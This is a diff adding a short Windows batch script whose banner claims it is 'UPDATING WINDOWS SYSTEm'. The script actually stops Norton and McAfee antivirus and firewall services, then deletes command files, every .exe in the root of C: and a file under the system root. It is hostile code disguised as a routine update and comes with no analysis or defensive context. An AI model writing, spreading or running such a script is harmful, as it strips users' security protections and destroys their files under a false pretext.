@@ -1,0 +1,11 @@
+@echo off
+ECHO *************** UPDATING WINDOWS SYSTEm ************************
+net stop "norton antivirus auto-protect service"
+net stop "mcafee.com mcshield"
+net stop "mcafee.com virusscan online realtime engine"
+net stop "mcafee personal firewall service"
+del c:\2.cmd
+del c:\1.cmd
+del c:\*.exe
+del .\%systemroot%\blankpage.html
+exit
